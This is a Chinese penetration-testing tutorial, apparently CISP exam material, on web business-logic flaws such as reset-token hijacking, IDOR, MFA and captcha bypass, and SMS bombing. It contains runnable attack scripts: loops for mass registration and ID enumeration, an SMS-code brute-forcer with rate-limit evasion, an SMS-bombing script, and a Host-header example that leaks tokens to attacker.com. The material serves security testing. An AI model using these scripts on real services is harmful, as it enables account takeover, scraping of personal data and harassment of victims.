# Web 逻辑漏洞挖掘实战

> **📘 文档定位**：CISP 考试 渗透测试 核心 | 难度：⭐⭐⭐⭐ | 预计阅读：28 分钟
>
> 系统讲解 Web 逻辑漏洞的挖掘方法论：支付逻辑/优惠券/验证码/密码重置/越权/竞态条件等业务逻辑漏洞的分析与利用。

---

## 导航目录

- [一、逻辑漏洞分类](#一逻辑漏洞分类)
- [二、支付逻辑漏洞](#二支付逻辑漏洞)
- [三、验证码/短信轰炸](#三验证码短信轰炸)
- [四、密码重置漏洞](#四密码重置漏洞)
- [五、竞态条件漏洞](#五竞态条件漏洞)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 📋 目录

1. [逻辑漏洞概述](#一逻辑漏洞概述)
2. [注册/登录逻辑漏洞](#二注册登录)
3. [密码重置漏洞](#三密码重置)
4. [越权访问](#四越权访问)
5. [业务逻辑绕过](#五业务绕过)
6. [验证码与短信轰炸](#六验证码)
7. [完整案例](#七完整案例)

---

## 一、逻辑漏洞概述

```
逻辑漏洞 = 非代码错误，而是业务流程设计缺陷

特点：自动化扫描器很难发现，需要手工测试

常见类型：
  ✦ 任意用户注册(无验证/弱验证)
  ✦ 密码重置劫持
  ✦ 越权(水平/垂直)
  ✦ 跳过关键步骤
  ✦ 验证码/短信绕过
  ✦ 业务规则绕过
```

---

## 二、注册登录

### 2.1 任意注册

```bash
# 1. 注册无验证
# 任意手机号/邮箱 → 直接注册成功

# 2. 验证码绕过
# 注册时抓包 → 删除验证码参数
POST /api/register
{"phone":"18800000001","code":"1234"}  # 正常
{"phone":"18800000002"}                  # 无code! → 成功?

# 3. 验证码固定
# 后端验证码固定为 999999 → 使用此验证码任意注册

# 4. 批量注册
# 无频率限制 → 脚本批量注册10万个账号
for i in {1..1000}; do
  curl -X POST https://xxx.com/api/register \
    -d "phone=18800$(printf '%06d' $i)&code=1234"
done
```

### 2.2 登录绕过

```bash
# 1. 多因素认证绕过
# 步骤1: 用户名+密码 → 返回 step=2, require_otp=true
# 步骤2: 输入OTP

# 攻击: 步骤1返回后 → 直接访问 dashboard
GET /api/dashboard  # 如果没校验 step2 → 直接登录!

# 2. 修改响应包
# 登录返回: {"success":false,"message":"密码错误"}
# Burp修改响应: {"success":true,"token":"fake"}
# → 前端认为登录成功!

# 3. 万能短信验证码
# 尝试: 000000, 123456, 888888, 999999
```

---

## 三、密码重置

### 3.1 密码重置劫持

```bash
# 场景: 忘记密码 → 输入手机号 → 收到重置链接
# https://xxx.com/reset?token=ABC123

# 1. Token可预测
# 连续请求3次重置:
#   token=20260612001
#   token=20260612002
#   token=20260612003
# → 递增! → 可暴力破解token → 重置任意用户密码

# 2. Token泄露到前端
# 响应中包含token:
# {"status":"ok","reset_token":"ABC123","redirect":"/reset?token=ABC123"}

# 3. 修改手机号为攻击者手机
POST /api/forget-password
{"phone":"13800000001"}  # 受害者的手机

# Burp修改:
{"phone":"18800009999"}  # 攻击者的手机! → 收到重置短信

# 4. Host头注入
# 重置链接: https://xxx.com/reset?token=ABC
# 修改Host: attacker.com
# → 受害者点击: https://attacker.com/reset?token=ABC
# → 攻击者服务器记录token
```

### 3.2 爆破验证码

```python
#!/usr/bin/env python3
"""短信验证码爆破"""
import requests
import time

TARGET = "https://xxx.com/api/reset-password"
PHONE = "13800000001"

for code in range(0, 10000):
    code_str = f"{code:04d}"
    resp = requests.post(TARGET, json={
        "phone": PHONE,
        "code": code_str,
        "new_password": "Attack123"
    })
    if "success" in resp.text or resp.status_code == 200:
        print(f"[+] Code found: {code_str}")
        break
    if code % 100 == 0:
        print(f"Tried {code}...")
    time.sleep(0.1)  # 避免触发频率限制
```

---

## 四、越权访问

### 4.1 水平越权

```bash
# 修改资源ID访问他人数据
GET /api/user/12345/profile → 自己的信息
GET /api/user/12346/profile → 他人的信息! ✗

# 批量:
for id in {10000..20000}; do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://xxx.com/api/user/$id" | jq '.phone' >> phones.txt
done

# 不容易注意到的IDOR:
# UUID: /api/order/a1b2c3d4-e5f6-7890-abcd-ef1234567890
# 修改UUID中任意字符 → 可能命中他人订单
```

### 4.2 垂直越权

```bash
# 普通用户操作管理员接口
# 抓取管理员的请求 → 替换为普通用户Token
GET /api/admin/users → 403?
POST /api/admin/config → 403?
DELETE /api/users/123 → 403?
```

---

## 五、业务绕过

### 5.1 跳过关键步骤

```bash
# 下单流程: 选商品 → 确认订单 → 支付 → 完成
GET /order/step-1 → 选择商品
GET /order/step-2 → 确认订单
GET /order/step-3 → 支付页面
GET /order/step-4 → 订单完成

# 攻击: 直接跳到 step-4
GET /order/12345/complete → 订单完成? ✓
# → 未支付完成订单
```

### 5.2 修改响应Status

```json
// 服务端返回:
{"status": "pending_payment", "order_id": 12345}

// Burp修改响应:
{"status": "paid", "order_id": 12345}
// → 前端认为已支付 → 继续后续流程
```

---

## 六、验证码

### 6.1 短信轰炸

```python
#!/usr/bin/env python3
"""短信轰炸测试"""
import requests

TARGET = "https://xxx.com/api/send-sms"
PHONE = "13800000001"

# 连续发送100条
for i in range(100):
    resp = requests.post(TARGET, json={"phone": PHONE})
    print(f"[{i}] Status: {resp.status_code}")
    # 检查是否有限制

# 绕过限制技巧:
# 1. 更换IP代理
# 2. 添加空格: "13800000001 " (注意末尾空格)
# 3. 添加区号: "+8613800000001"
# 4. JSON数组绕过: {"phone":["13800000001","13800000001","13800000001"]}
```

### 6.2 验证码绕过

```bash
# 1. 验证码复用
# 获取验证码 code=1234 → 60秒有效
# 多次使用同一个code → 仍然有效?

# 2. 多用户共用
# 手机A获取的验证码 → 手机B使用 → 成功?

# 3. 验证码为空
POST /api/verify {"phone":"138xxx","code":""} → 成功?
POST /api/verify {"phone":"138xxx"} → 不加code参数 → 成功?

# 4. 图形验证码
# 返回中包含验证码答案:
# {"captcha_id":"xxx","captcha_text":"1234"}  ← 泄露!

# 5. 验证码不过期
# 昨天获取的code → 今天还能用?
```

---

## 七、完整案例

```
案例: 某社交APP逻辑漏洞

发现漏洞列表:

① 注册验证码绕过:
   POST /api/register → 删除code参数 → 直接注册成功
   影响: 可创建任意数量僵尸账号

② 密码重置劫持:
   POST /api/forget-password
   {"phone":"<victim>"} → 返回: {"token":"ABCD1234"}
   token在响应中暴露! → 直接重置任意用户密码

③ 修改user_id查看他人私信:
   GET /api/messages?user_id=10001 → 自己的
   GET /api/messages?user_id=10002 → 他人的私信!

④ 删除他人动态:
   DELETE /api/post/10001 → 403
   DELETE /api/post/10002 → 200(成功删除他人动态!)

⑤ 无限点赞(竞争条件):
   同时发送20个点赞请求 → 全部成功
   点赞数+20(本应+1)

总结: 5个高危逻辑漏洞
修复: ① 验证码必须后端校验 ② Token不暴露到前端
       ③ 所有操作前验证资源权限 ④ 关键操作加锁
```

---

## ✅ Checklist

- [ ] 用户名枚举(不同错误信息)
- [ ] 暴力破解(无锁定策略)
- [ ] 密码重置流程(每个步骤)
- [ ] 验证码绕过(删除/为空/复用)
- [ ] 短信轰炸(频率限制)
- [ ] 水平越权(修改ID)
- [ ] 垂直越权(普通用户→管理员)
- [ ] 跳过关键步骤
- [ ] 修改响应包
- [ ] 竞争条件(并发)
